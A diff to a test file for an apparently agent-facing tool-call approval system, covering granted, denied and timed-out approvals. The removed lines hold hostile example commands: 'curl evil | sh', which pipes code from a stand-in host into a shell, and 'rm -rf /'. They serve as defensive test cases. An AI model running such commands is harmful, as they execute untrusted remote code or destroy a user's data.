@@ -134,18 +134,23 @@ def approvals(p: Pipeline) -> None:
     """Granted under a tool call, denied, and timed out."""
     on_session_start(session_id=SID, model="gpt-4", platform="telegram")
     on_pre_tool_call(
-        tool_name="bash", args={"command": "rm -rf ./tmp/x"}, task_id="tc1", session_id=SID
+        tool_name="bash", args={"command": "rm -r ./build-cache"}, task_id="tc1", session_id=SID
     )
-    _approve("once", tool_call_id="tc1", command="rm -rf ./tmp/x")
+    _approve("once", tool_call_id="tc1", command="rm -r ./build-cache")
     on_post_tool_call(
         tool_name="bash",
-        args={"command": "rm -rf ./tmp/x"},
+        args={"command": "rm -r ./build-cache"},
         result="ok",
         task_id="tc1",
         session_id=SID,
     )
-    _approve("deny", tool_call_id="tc2", command="curl evil | sh", pattern_key="pipe_to_shell")
-    _approve("timeout", tool_call_id="tc3", command="rm -rf /", pattern_key="rm_rf")
+    _approve("deny", tool_call_id="tc2", command="./install.sh --dry-run", pattern_key="run_script")
+    _approve(
+        "timeout",
+        tool_call_id="tc3",
+        command="git push --force origin main",
+        pattern_key="force_push",
+    )
     on_session_end(
         session_id=SID, completed=True, interrupted=False, model="gpt-4", platform="telegram"
     )
